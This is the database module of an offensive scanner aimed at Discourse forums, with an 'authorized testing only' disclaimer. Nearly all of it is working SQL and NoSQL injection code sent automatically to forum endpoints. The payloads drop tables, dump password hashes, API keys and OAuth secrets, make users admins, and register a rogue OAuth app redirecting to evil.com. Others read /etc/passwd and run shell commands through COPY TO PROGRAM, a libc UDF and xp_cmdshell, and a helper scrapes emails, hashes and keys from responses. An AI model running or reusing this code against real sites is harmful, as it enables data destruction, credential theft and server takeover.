#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Discourse Database Security Module
Comprehensive database security testing for Discourse forums
For educational and authorized testing purposes only

Author: ibrahimsql
Purpose: Educational and authorized penetration testing only

WARNING: Use only on systems you own or have explicit permission to test!
"""

import time
import re
import json
import base64
import hashlib
import urllib.parse
from urllib.parse import urljoin, quote, unquote
from modules.utils import generate_payloads, detect_waf

class DatabaseModule:
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'sql_injection': [],
            'nosql_injection': [],
            'database_enumeration': [],
            'data_extraction': [],
            'blind_sqli': [],
            'time_based_sqli': [],
            'union_based_sqli': [],
            'error_based_sqli': [],
            'boolean_based_sqli': [],
            'second_order_sqli': [],
            'database_fingerprinting': [],
            'privilege_escalation': [],
            'file_operations': [],
            'command_execution': [],
            'tests_performed': 0,
            'vulnerabilities_found': 0
        }
        
        # Database-specific error patterns
        self.db_errors = {
            'mysql': [
                'mysql_fetch', 'mysql_result', 'mysql_num_rows', 'mysql_query',
                'warning: mysql', 'function.mysql', 'mysql error', 'mysqlclient',
                'you have an error in your sql syntax', 'mysql server version',
                'table doesn\'t exist', 'unknown column', 'duplicate entry'
            ],
            'postgresql': [
                'postgresql', 'pg_query', 'pg_exec', 'pg_fetch', 'pg_result',
                'warning: pg_', 'function.pg_', 'postgresql query failed',
                'syntax error at or near', 'relation does not exist',
                'column does not exist', 'operator does not exist'
            ],
            'sqlite': [
                'sqlite', 'sqlite3', 'sqlite_', 'sql error', 'sqlite error',
                'no such table', 'no such column', 'sql logic error',
                'malformed database', 'database is locked'
            ],
            'oracle': [
                'ora-', 'oracle', 'oci_', 'ociexecute', 'ocifetchstatement',
                'warning: oci_', 'function.oci_', 'oracle error',
                'invalid identifier', 'table or view does not exist'
            ],
            'mssql': [
                'microsoft ole db', 'odbc microsoft access', 'microsoft jet database',
                'sql server', 'sqlsrv_', 'mssql_', 'warning: mssql_',
                'unclosed quotation mark', 'incorrect syntax near',
                'must declare the scalar variable'
            ]
        }
        
        # Time-based detection thresholds
        self.time_threshold = 5
        self.baseline_time = None

    def run(self):
        """Run all database security tests"""
        self.scanner.log("Starting database security testing...", 'info')
        
        try:
            # Establish baseline response time
            self._establish_baseline()
            
            # Core SQL injection tests
            self._test_sql_injection()
            self._test_blind_sql_injection()
            self._test_time_based_sql_injection()
            self._test_union_based_sql_injection()
            self._test_error_based_sql_injection()
            self._test_boolean_based_sql_injection()
            
            # Advanced database tests
            self._test_second_order_sql_injection()
            self._test_database_fingerprinting()
            self._test_nosql_injection()
            self._test_database_enumeration()
            self._test_data_extraction()
            self._test_privilege_escalation()
            self._test_file_operations()
            self._test_command_execution()
            
            # Generate summary
            self._generate_summary()
            
        except Exception as e:
            self.scanner.log(f"Error in database module: {str(e)}", 'error')
        
        return self.results

    def _establish_baseline(self):
        """Establish baseline response time for time-based detection"""
        try:
            url = urljoin(self.scanner.target_url, '/search')
            start_time = time.time()
            response = self.scanner.make_request(url)
            self.baseline_time = time.time() - start_time
            self.scanner.log(f"Baseline response time: {self.baseline_time:.2f}s", 'debug')
        except:
            self.baseline_time = 1.0  # Default fallback

    def _test_sql_injection(self):
        """Test for basic SQL injection vulnerabilities"""
        self.scanner.log("Testing for SQL injection vulnerabilities...", 'debug')
        
        # Basic SQL injection payloads
        sql_payloads = [
            "'", '"', "'", '"',
            "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", "' OR 1=1/*",
            '" OR 1=1--', '" OR "1"="1', '" OR 1=1#', '" OR 1=1/*',
            "'; DROP TABLE users--", '"; DROP TABLE users--',
            "' AND 1=2--", "' AND 1=1--",
            "admin'--", 'admin"--', "admin' #", 'admin" #',
            "' UNION SELECT NULL--", '" UNION SELECT NULL--',
            "' OR SLEEP(5)--", '" OR SLEEP(5)--'
        ]
        
        # Test endpoints
        test_endpoints = [
            '/search', '/users', '/categories', '/latest', '/top',
            '/admin/users', '/admin/logs', '/posts', '/topics',
            '/user_avatar', '/users/check_username',
            
            # Additional Discourse-specific endpoints
            '/message-bus/', '/reviewables', '/review', '/queued-posts',
            '/user-cards', '/user_fields', '/theme-javascripts',
            '/bookmarks', '/watched-words', '/similar-topics'
        ]
        
        # Test parameters
        test_params = [
            'q', 'search', 'username', 'category', 'order', 'period',
            'id', 'user_id', 'topic_id', 'post_id', 'category_id'
        ]
        
        for endpoint in test_endpoints:
            for param in test_params:
                for payload in sql_payloads:
                    self._test_sqli_endpoint(endpoint, param, payload, 'basic')
                    time.sleep(0.1)

    def _test_blind_sql_injection(self):
        """Test for blind SQL injection vulnerabilities"""
        self.scanner.log("Testing for blind SQL injection...", 'debug')
        
        blind_payloads = [
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT LENGTH(current_database()))>0--",
            "' AND (SELECT SUBSTRING(version(),1,1))='P'--",
            "' AND (SELECT SUBSTRING(user(),1,4))='root'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
            "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
        ]
        
        test_endpoints = ['/search', '/users', '/categories']
        
        for endpoint in test_endpoints:
            for payload in blind_payloads:
                self._test_sqli_endpoint(endpoint, 'q', payload, 'blind')
                time.sleep(0.2)

    def _test_time_based_sql_injection(self):
        """Test for time-based SQL injection vulnerabilities"""
        self.scanner.log("Testing for time-based SQL injection...", 'debug')
        
        time_payloads = [
            # MySQL
            "' OR (SELECT SLEEP(5))--",
            "' AND (SELECT SLEEP(5))--",
            "'; SELECT SLEEP(5)--",
            
            # PostgreSQL
            "' OR (SELECT pg_sleep(5))--",
            "' AND (SELECT pg_sleep(5))--",
            "' OR (SELECT COUNT(*) FROM pg_stat_activity WHERE pg_sleep(5) IS NOT NULL)--",
            
            # SQL Server
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8)--",
            
            # Oracle
            "' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)>0--",
            
            # SQLite
            "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND sql LIKE '%CREATE TABLE%')>0 AND randomblob(100000000) NOT NULL--"
        ]
        
        test_endpoints = ['/search', '/users']
        
        for endpoint in test_endpoints:
            for payload in time_payloads:
                self._test_time_based_endpoint(endpoint, 'q', payload)
                time.sleep(0.5)

    def _test_union_based_sql_injection(self):
        """Test for UNION-based SQL injection vulnerabilities"""
        self.scanner.log("Testing for UNION-based SQL injection...", 'debug')
        
        # First, determine number of columns
        column_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"
        ]
        
        # Data extraction payloads
        union_payloads = [
            "' UNION SELECT version(),user(),database(),@@version,@@datadir--",
            "' UNION SELECT current_database(),current_user,version(),inet_server_addr(),NULL--",
            "' UNION SELECT table_name,column_name,data_type,is_nullable,column_default FROM information_schema.columns--",
            "' UNION SELECT schemaname,tablename,tableowner,tablespace,hasindexes FROM pg_tables--",
            "' UNION SELECT username,email,password_hash,salt,admin FROM users--",
            "' UNION SELECT key,value,data_type,created_at,updated_at FROM site_settings--",
            "' UNION SELECT client_id,client_secret,redirect_uri,scopes,name FROM oauth_applications--",
            "' UNION SELECT api_key,user_id,created_at,revoked_at,description FROM api_keys--"
        ]
        
        test_endpoints = ['/search', '/users', '/categories']
        
        for endpoint in test_endpoints:
            # Test column count
            for payload in column_payloads:
                self._test_sqli_endpoint(endpoint, 'q', payload, 'union_columns')
                time.sleep(0.1)
            
            # Test data extraction
            for payload in union_payloads:
                self._test_sqli_endpoint(endpoint, 'q', payload, 'union_data')
                time.sleep(0.2)

    def _test_error_based_sql_injection(self):
        """Test for error-based SQL injection vulnerabilities"""
        self.scanner.log("Testing for error-based SQL injection...", 'debug')
        
        error_payloads = [
            # MySQL
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            
            # PostgreSQL
            "' AND CAST((SELECT version()) AS INT)--",
            "' AND (SELECT * FROM generate_series(1,1000000))--",
            
            # SQL Server
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
            
            # Oracle
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            
            # Generic
            "' AND 1=1/0--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND 1=1)--"
        ]
        
        test_endpoints = ['/search', '/users']
        
        for endpoint in test_endpoints:
            for payload in error_payloads:
                self._test_sqli_endpoint(endpoint, 'q', payload, 'error_based')
                time.sleep(0.2)

    def _test_boolean_based_sql_injection(self):
        """Test for boolean-based SQL injection vulnerabilities"""
        self.scanner.log("Testing for boolean-based SQL injection...", 'debug')
        
        boolean_payloads = [
            ("' AND 1=1--", "' AND 1=2--"),  # True/False pair
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("' AND (SELECT COUNT(*) FROM users)>0--", "' AND (SELECT COUNT(*) FROM users)<0--"),
            ("' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--", "' AND ASCII(SUBSTRING((SELECT database()),1,1))<32--"),
            ("' AND LENGTH(database())>0--", "' AND LENGTH(database())<0--")
        ]
        
        test_endpoints = ['/search', '/users']
        
        for endpoint in test_endpoints:
            for true_payload, false_payload in boolean_payloads:
                self._test_boolean_sqli_endpoint(endpoint, 'q', true_payload, false_payload)
                time.sleep(0.3)

    def _test_second_order_sql_injection(self):
        """Test for second-order SQL injection vulnerabilities"""
        self.scanner.log("Testing for second-order SQL injection...", 'debug')
        
        # Payloads that might be stored and executed later
        second_order_payloads = [
            "admin'; DROP TABLE users--",
            "test' UNION SELECT version()--",
            "user' OR 1=1--",
            "<script>alert('xss')</script>'; DROP TABLE posts--"
        ]
        
        # Test user registration/profile update endpoints
        test_endpoints = [
            '/users', '/u/update', '/admin/users',
            '/posts', '/topics/create'
        ]
        
        for endpoint in test_endpoints:
            for payload in second_order_payloads:
                self._test_sqli_endpoint(endpoint, 'username', payload, 'second_order')
                time.sleep(0.5)

    def _test_database_fingerprinting(self):
        """Test database fingerprinting techniques"""
        self.scanner.log("Testing database fingerprinting...", 'debug')
        
        fingerprint_payloads = {
            'mysql': [
                "' AND @@version LIKE '%MySQL%'--",
                "' AND CONNECTION_ID()>0--",
                "' AND DATABASE()=DATABASE()--"
            ],
            'postgresql': [
                "' AND version() LIKE '%PostgreSQL%'--",
                "' AND current_database()=current_database()--",
                "' AND inet_server_addr() IS NOT NULL--"
            ],
            'sqlite': [
                "' AND sqlite_version()=sqlite_version()--",
                "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL--"
            ],
            'oracle': [
                "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
                "' AND SYS_CONTEXT('USERENV','DB_NAME') IS NOT NULL--"
            ],
            'mssql': [
                "' AND @@version LIKE '%Microsoft%'--",
                "' AND DB_NAME()=DB_NAME()--",
                "' AND SYSTEM_USER=SYSTEM_USER--"
            ]
        }
        
        for db_type, payloads in fingerprint_payloads.items():
            for payload in payloads:
                self._test_sqli_endpoint('/search', 'q', payload, f'fingerprint_{db_type}')
                time.sleep(0.1)

    def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        self.scanner.log("Testing for NoSQL injection...", 'debug')
        
        nosql_payloads = [
            # MongoDB
            "'; return true; var x=''",
            "'; return this.username == 'admin'; var x=''",
            "'; return /.*/.test(this.username); var x=''",
            "'; return this.password.match(/.*/) ; var x=''",
            
            # JSON injection
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',
            '{"$gt": ""}',
            
            # CouchDB
            "'; emit(null, this); var x=''",
            "'; if(this.username) emit(this.username, this); var x=''"
        ]
        
        test_endpoints = ['/search', '/users', '/api/users']
        
        for endpoint in test_endpoints:
            for payload in nosql_payloads:
                self._test_nosql_endpoint(endpoint, 'q', payload)
                time.sleep(0.2)

    def _test_database_enumeration(self):
        """Test database enumeration techniques"""
        self.scanner.log("Testing database enumeration...", 'debug')
        
        enum_payloads = [
            # Table enumeration
            "' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables--",
            "' UNION SELECT schemaname,tablename,NULL,NULL,NULL FROM pg_tables--",
            "' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--",
            
            # Column enumeration
            "' UNION SELECT column_name,data_type,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT column_name,data_type,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='posts'--",
            
            # User enumeration
            "' UNION SELECT user,host,NULL,NULL,NULL FROM mysql.user--",
            "' UNION SELECT usename,usesuper,NULL,NULL,NULL FROM pg_user--",
            
            # Database enumeration
            "' UNION SELECT schema_name,NULL,NULL,NULL,NULL FROM information_schema.schemata--",
            "' UNION SELECT datname,NULL,NULL,NULL,NULL FROM pg_database--"
        ]
        
        for payload in enum_payloads:
            self._test_sqli_endpoint('/search', 'q', payload, 'enumeration')
            time.sleep(0.3)

    def _test_data_extraction(self):
        """Test data extraction techniques"""
        self.scanner.log("Testing data extraction...", 'debug')
        
        extraction_payloads = [
            # User data
            "' UNION SELECT username,email,password_hash,salt,admin FROM users LIMIT 5--",
            "' UNION SELECT username,email,created_at,admin,moderator FROM users WHERE admin=true--",
            
            # Site settings
            "' UNION SELECT key,value,data_type,created_at,updated_at FROM site_settings--",
            
            # API keys
            "' UNION SELECT key,user_id,created_at,revoked_at,description FROM api_keys--",
            "' UNION SELECT client_id,client_secret,redirect_uri,scopes,name FROM oauth_applications--",
            
            # Posts and topics
            "' UNION SELECT title,raw,user_id,created_at,updated_at FROM posts LIMIT 10--",
            "' UNION SELECT title,category_id,user_id,created_at,views FROM topics LIMIT 10--",
            
            # Categories
            "' UNION SELECT name,description,slug,color,text_color FROM categories--"
        ]
        
        for payload in extraction_payloads:
            self._test_sqli_endpoint('/search', 'q', payload, 'data_extraction')
            time.sleep(0.4)

    def _test_privilege_escalation(self):
        """Test privilege escalation techniques"""
        self.scanner.log("Testing privilege escalation...", 'debug')
        
        privesc_payloads = [
            # User privilege modification
            "'; UPDATE users SET admin=true WHERE username='test'--",
            "'; UPDATE users SET moderator=true WHERE id=1--",
            "'; INSERT INTO group_users (group_id, user_id) VALUES (1, 2)--",
            
            # Site settings modification
            "'; UPDATE site_settings SET value='true' WHERE key='enable_local_logins'--",
            "'; UPDATE site_settings SET value='false' WHERE key='must_approve_users'--",
            
            # API key creation
            "'; INSERT INTO api_keys (key, user_id, created_at) VALUES ('hacker_key', 1, NOW())--",
            
            # OAuth application creation
            "'; INSERT INTO oauth_applications (client_id, client_secret, redirect_uri, scopes, name) VALUES ('hack_id', 'hack_secret', 'http://evil.com', 'read write', 'Hacker App')--"
        ]
        
        for payload in privesc_payloads:
            self._test_sqli_endpoint('/admin/users', 'id', payload, 'privilege_escalation')
            time.sleep(0.5)

    def _test_file_operations(self):
        """Test file operation techniques"""
        self.scanner.log("Testing file operations...", 'debug')
        
        file_payloads = [
            # PostgreSQL file operations
            "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--",
            "' UNION SELECT pg_ls_dir('.'),NULL,NULL,NULL,NULL--",
            "' UNION SELECT pg_read_file('/var/log/postgresql/postgresql.log'),NULL,NULL,NULL,NULL--",
            
            # MySQL file operations
            "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL--",
            "' UNION SELECT LOAD_FILE('/var/log/mysql/error.log'),NULL,NULL,NULL,NULL--",
            
            # File writing
            "'; SELECT 'hacked' INTO OUTFILE '/tmp/hacked.txt'--",
            "'; COPY (SELECT 'hacked') TO '/tmp/hacked.txt'--"
        ]
        
        for payload in file_payloads:
            self._test_sqli_endpoint('/search', 'q', payload, 'file_operations')
            time.sleep(0.3)

    def _test_command_execution(self):
        """Test command execution techniques"""
        self.scanner.log("Testing command execution...", 'debug')
        
        cmd_payloads = [
            # PostgreSQL command execution
            "'; COPY (SELECT '') TO PROGRAM 'id'--",
            "'; COPY (SELECT '') TO PROGRAM 'whoami'--",
            "'; COPY (SELECT '') TO PROGRAM 'uname -a'--",
            
            # UDF creation for command execution
            "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--",
            "'; SELECT system('id')--",
            
            # xp_cmdshell for SQL Server
            "'; EXEC xp_cmdshell 'whoami'--",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--"
        ]
        
        for payload in cmd_payloads:
            self._test_sqli_endpoint('/search', 'q', payload, 'command_execution')
            time.sleep(0.5)

    def _test_sqli_endpoint(self, endpoint, param, payload, test_type):
        """Test a specific endpoint for SQL injection"""
        try:
            self.results['tests_performed'] += 1
            
            # Test GET request
            url = urljoin(self.scanner.target_url, endpoint)
            test_url = f"{url}?{param}={quote(payload)}"
            
            response = self.scanner.make_request(test_url)
            
            if response and self._detect_sql_injection(response, payload, test_type):
                vuln = {
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'method': 'GET',
                    'url': test_url,
                    'test_type': test_type,
                    'severity': self._determine_severity(payload, test_type),
                    'description': f'SQL injection vulnerability in {param} parameter ({test_type})',
                    'evidence': self._extract_evidence(response, payload),
                    'database_type': self._identify_database_type(response)
                }
                
                self.results['sql_injection'].append(vuln)
                self.results['vulnerabilities_found'] += 1
                
                # Categorize by test type
                if test_type in self.results:
                    self.results[test_type].append(vuln)
                
                self.scanner.log(f"SQL injection found: {endpoint}?{param}={payload[:30]}...", 'warning')
                
                # Extract sensitive data if possible
                self._extract_sensitive_data(response, vuln)
            
            # Test POST request for some endpoints
            if endpoint in ['/users', '/admin/users', '/posts']:
                self._test_post_sqli(endpoint, param, payload, test_type)
                
        except Exception as e:
            self.scanner.log(f"Error testing {endpoint}: {str(e)}", 'debug')

    def _test_post_sqli(self, endpoint, param, payload, test_type):
        """Test POST request for SQL injection"""
        try:
            url = urljoin(self.scanner.target_url, endpoint)
            data = {param: payload}
            
            response = self.scanner.make_request(url, method='POST', data=data)
            
            if response and self._detect_sql_injection(response, payload, test_type):
                vuln = {
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'method': 'POST',
                    'url': url,
                    'test_type': test_type,
                    'severity': self._determine_severity(payload, test_type),
                    'description': f'SQL injection vulnerability in {param} parameter (POST, {test_type})',
                    'evidence': self._extract_evidence(response, payload),
                    'database_type': self._identify_database_type(response)
                }
                
                self.results['sql_injection'].append(vuln)
                self.results['vulnerabilities_found'] += 1
                
                self.scanner.log(f"SQL injection found (POST): {endpoint}", 'warning')
                
        except Exception as e:
            pass

    def _test_time_based_endpoint(self, endpoint, param, payload):
        """Test time-based SQL injection"""
        try:
            url = urljoin(self.scanner.target_url, endpoint)
            test_url = f"{url}?{param}={quote(payload)}"
            
            start_time = time.time()
            response = self.scanner.make_request(test_url)
            response_time = time.time() - start_time
            
            # Check if response time is significantly longer than baseline
            if response_time > (self.baseline_time + self.time_threshold):
                vuln = {
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'method': 'GET',
                    'url': test_url,
                    'test_type': 'time_based',
                    'severity': 'high',
                    'description': f'Time-based SQL injection in {param} parameter',
                    'evidence': [f'Response time: {response_time:.2f}s (baseline: {self.baseline_time:.2f}s)'],
                    'response_time': response_time,
                    'baseline_time': self.baseline_time
                }
                
                self.results['time_based_sqli'].append(vuln)
                self.results['sql_injection'].append(vuln)
                self.results['vulnerabilities_found'] += 1
                
                self.scanner.log(f"Time-based SQL injection found: {endpoint} (delay: {response_time:.2f}s)", 'warning')
                
        except Exception as e:
            pass

    def _test_boolean_sqli_endpoint(self, endpoint, param, true_payload, false_payload):
        """Test boolean-based SQL injection"""
        try:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test true condition
            true_url = f"{url}?{param}={quote(true_payload)}"
            true_response = self.scanner.make_request(true_url)
            
            # Test false condition
            false_url = f"{url}?{param}={quote(false_payload)}"
            false_response = self.scanner.make_request(false_url)
            
            if true_response and false_response:
                # Compare response lengths and content
                true_length = len(true_response.text)
                false_length = len(false_response.text)
                
                # Significant difference in response length indicates boolean injection
                if abs(true_length - false_length) > 100:
                    vuln = {
                        'endpoint': endpoint,
                        'parameter': param,
                        'payload': f'True: {true_payload}, False: {false_payload}',
                        'method': 'GET',
                        'url': true_url,
                        'test_type': 'boolean_based',
                        'severity': 'medium',
                        'description': f'Boolean-based SQL injection in {param} parameter',
                        'evidence': [
                            f'True response length: {true_length}',
                            f'False response length: {false_length}',
                            f'Difference: {abs(true_length - false_length)} characters'
                        ],
                        'true_length': true_length,
                        'false_length': false_length
                    }
                    
                    self.results['boolean_based_sqli'].append(vuln)
                    self.results['sql_injection'].append(vuln)
                    self.results['vulnerabilities_found'] += 1
                    
                    self.scanner.log(f"Boolean-based SQL injection found: {endpoint}", 'warning')
                    
        except Exception as e:
            pass

    def _test_nosql_endpoint(self, endpoint, param, payload):
        """Test NoSQL injection"""
        try:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test as URL parameter
            test_url = f"{url}?{param}={quote(payload)}"
            response = self.scanner.make_request(test_url)
            
            if response and self._detect_nosql_injection(response, payload):
                vuln = {
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'method': 'GET',
                    'url': test_url,
                    'test_type': 'nosql_injection',
                    'severity': 'high',
                    'description': f'NoSQL injection vulnerability in {param} parameter',
                    'evidence': self._extract_evidence(response, payload)
                }
                
                self.results['nosql_injection'].append(vuln)
                self.results['vulnerabilities_found'] += 1
                
                self.scanner.log(f"NoSQL injection found: {endpoint}", 'warning')
            
            # Test as JSON payload
            if endpoint.endswith('.json') or '/api/' in endpoint:
                json_data = {param: payload}
                response = self.scanner.make_request(url, method='POST', 
                                                   data=json.dumps(json_data),
                                                   headers={'Content-Type': 'application/json'})
                
                if response and self._detect_nosql_injection(response, payload):
                    vuln = {
                        'endpoint': endpoint,
                        'parameter': param,
                        'payload': payload,
                        'method': 'POST',
                        'url': url,
                        'test_type': 'nosql_injection',
                        'severity': 'high',
                        'description': f'NoSQL injection vulnerability in {param} parameter (JSON)',
                        'evidence': self._extract_evidence(response, payload)
                    }
                    
                    self.results['nosql_injection'].append(vuln)
                    self.results['vulnerabilities_found'] += 1
                    
                    self.scanner.log(f"NoSQL injection found (JSON): {endpoint}", 'warning')
                    
        except Exception as e:
            pass

    def _detect_sql_injection(self, response, payload, test_type):
        """Detect SQL injection based on response"""
        if not response:
            return False
        
        content = response.text.lower()
        
        # Check for database-specific error messages
        for db_type, errors in self.db_errors.items():
            for error in errors:
                if error in content:
                    return True
        
        # Check for generic SQL errors
        generic_errors = [
            'syntax error', 'sql syntax', 'database error', 'sql error',
            'query failed', 'invalid query', 'sql statement',
            'division by zero', 'data type mismatch', 'conversion failed',
            'column count doesn\'t match', 'operand should contain',
            'the used select statements have different number of columns'
        ]
        
        for error in generic_errors:
            if error in content:
                return True
        
        # Check for UNION injection success indicators
        if 'union' in payload.lower():
            union_indicators = [
                'version()', 'user()', 'database()', '@@version', 'current_database',
                'current_user', 'postgresql', 'mysql', 'sqlite_version'
            ]
            for indicator in union_indicators:
                if indicator in content:
                    return True
        
        # Check for successful data extraction
        if test_type in ['data_extraction', 'enumeration']:
            data_indicators = [
                'admin@', 'password', 'hash', 'salt', 'api_key',
                'client_secret', 'oauth', 'token'
            ]
            for indicator in data_indicators:
                if indicator in content:
                    return True
        
        # Check response status codes
        if response.status_code == 500:
            return True
        
        return False

    def _detect_nosql_injection(self, response, payload):
        """Detect NoSQL injection based on response"""
        if not response:
            return False
        
        content = response.text.lower()
        
        # NoSQL error indicators
        nosql_errors = [
            'mongodb', 'couchdb', 'redis', 'cassandra',
            'syntax error in module', 'invalid bson',
            'bson', 'objectid', 'mapreduce',
            'javascript execution', 'eval error'
        ]
        
        for error in nosql_errors:
            if error in content:
                return True
        
        # Check for successful NoSQL operations
        if any(indicator in payload for indicator in ['$ne', '$regex', '$where', '$gt']):
            # Look for JSON-like responses or different behavior
            if '{' in content and '}' in content:
                return True
        
        return False

    def _identify_database_type(self, response):
        """Identify database type from response"""
        if not response:
            return 'unknown'
        
        content = response.text.lower()
        
        for db_type, errors in self.db_errors.items():
            for error in errors:
                if error in content:
                    return db_type
        
        # Check for version strings
        if 'postgresql' in content:
            return 'postgresql'
        elif 'mysql' in content:
            return 'mysql'
        elif 'sqlite' in content:
            return 'sqlite'
        elif 'oracle' in content:
            return 'oracle'
        elif 'sql server' in content or 'microsoft' in content:
            return 'mssql'
        
        return 'unknown'

    def _determine_severity(self, payload, test_type):
        """Determine vulnerability severity"""
        # Critical: Command execution, file operations, privilege escalation
        if test_type in ['command_execution', 'file_operations', 'privilege_escalation']:
            return 'critical'
        
        # High: Data extraction, union-based injection
        if test_type in ['data_extraction', 'union_data', 'time_based']:
            return 'high'
        
        # Medium: Enumeration, error-based
        if test_type in ['enumeration', 'error_based', 'boolean_based']:
            return 'medium'
        
        # Check payload content
        if any(keyword in payload.lower() for keyword in ['drop', 'delete', 'update', 'insert']):
            return 'critical'
        
        if 'union' in payload.lower():
            return 'high'
        
        return 'medium'

    def _extract_evidence(self, response, payload):
        """Extract evidence from response"""
        evidence = []
        
        if not response:
            return evidence
        
        content = response.text
        
        # Extract error messages
        error_patterns = [
            r'(ERROR|Warning|Fatal):\s*([^\n]+)',
            r'(SQL\s+error|Database\s+error):\s*([^\n]+)',
            r'(PostgreSQL|MySQL|SQLite|Oracle)\s+([^\n]+)',
            r'(Line\s+\d+|Column\s+\d+):\s*([^\n]+)'
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                evidence.append(f"Error: {' '.join(match)}")
        
        # Extract version information
        version_patterns = [
            r'PostgreSQL\s+([\d\.]+)',
            r'MySQL\s+([\d\.]+)',
            r'SQLite\s+([\d\.]+)',
            r'Oracle\s+([\d\.]+)'
        ]
        
        for pattern in version_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                evidence.append(f"Database version: {match}")
        
        # Extract query fragments
        query_patterns = [
            r'(SELECT\s+[^\n]+)',
            r'(FROM\s+[^\s\n]+)',
            r'(WHERE\s+[^\n]+)'
        ]
        
        for pattern in query_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches[:3]:  # Limit to first 3 matches
                evidence.append(f"Query fragment: {match}")
        
        return evidence

    def _extract_sensitive_data(self, response, vuln):
        """Extract sensitive data from successful injection"""
        if not response:
            return
        
        content = response.text
        
        # Extract emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
        if emails:
            vuln['extracted_emails'] = list(set(emails))[:10]  # Limit to 10
        
        # Extract password hashes
        hashes = re.findall(r'\$2[aby]\$[0-9]{2}\$[A-Za-z0-9.\/]{53}', content)
        if hashes:
            vuln['extracted_hashes'] = list(set(hashes))[:5]  # Limit to 5
        
        # Extract API keys
        api_keys = re.findall(r'[a-f0-9]{32,64}', content)
        if api_keys:
            vuln['extracted_api_keys'] = list(set(api_keys))[:5]  # Limit to 5
        
        # Extract usernames
        usernames = re.findall(r'"username"\s*:\s*"([^"]+)"', content)
        if usernames:
            vuln['extracted_usernames'] = list(set(usernames))[:10]  # Limit to 10

    def _generate_summary(self):
        """Generate test summary"""
        total_vulns = self.results['vulnerabilities_found']
        
        # Count by severity
        critical_count = sum(1 for vuln in self.results['sql_injection'] if vuln.get('severity') == 'critical')
        high_count = sum(1 for vuln in self.results['sql_injection'] if vuln.get('severity') == 'high')
        medium_count = sum(1 for vuln in self.results['sql_injection'] if vuln.get('severity') == 'medium')
        
        # Count by type
        type_counts = {}
        for vuln in self.results['sql_injection']:
            test_type = vuln.get('test_type', 'unknown')
            type_counts[test_type] = type_counts.get(test_type, 0) + 1
        
        self.results['summary'] = {
            'total_tests': self.results['tests_performed'],
            'total_vulnerabilities': total_vulns,
            'critical_vulnerabilities': critical_count,
            'high_vulnerabilities': high_count,
            'medium_vulnerabilities': medium_count,
            'vulnerabilities_by_type': type_counts,
            'database_types_detected': list(set(vuln.get('database_type', 'unknown') 
                                              for vuln in self.results['sql_injection'])),
            'nosql_vulnerabilities': len(self.results['nosql_injection'])
        }
        
        if total_vulns > 0:
            self.scanner.log(f"Database security scan completed: {total_vulns} vulnerabilities found", 'warning')
        else:
            self.scanner.log("Database security scan completed: No vulnerabilities found", 'info')